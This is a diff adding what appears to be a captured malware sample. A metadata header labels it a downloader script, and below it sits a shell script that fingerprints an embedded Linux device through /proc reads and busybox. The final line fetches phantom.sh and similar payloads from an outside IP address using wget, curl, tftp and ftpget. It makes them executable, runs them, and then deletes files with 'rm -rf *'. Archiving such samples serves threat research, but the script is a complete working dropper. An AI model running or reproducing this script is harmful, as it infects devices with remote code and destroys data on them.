@@ -1,0 +1,20 @@
+# sha256: 50fe8c4827ace4d8c35c57ba40e5f439035fec1b044f1a740bf9e7c52a92fd0a
+# family: downloader
+# kind: script
+# size_bytes: 719
+# first_seen: 2026-07-22 23:22:45.398973 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+echo SHELL_TEST_OK
+echo T
+cat /proc/cpuinfo
+cat /proc/mtd
+cat /proc/net/arp
+cat /proc/uptime
+busybox --help
+cat /proc/self/status 2>/dev/null | head -5
+ls /etc/passwd 2>/dev/null && cat /proc/version 2>/dev/null
+cat /proc/sys/kernel/hostname
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://91.92.42.213/phantom.sh; curl -O http://91.92.42.213/phantom.sh; chmod 777 phantom.sh; sh phantom.sh; tftp 91.92.42.213 -c get phantom.sh; chmod 777 phantom.sh; sh phantom.sh; tftp -r phantom2.sh -g 91.92.42.213; chmod 777 phantom2.sh; sh phantom2.sh; ftpget -v -u anonymous -p anonymous -P 21 91.92.42.213 phantom1.sh phantom1.sh; sh phantom1.sh; rm -rf phantom.sh phantom.sh phantom2.sh phantom1.sh; rm -rf *
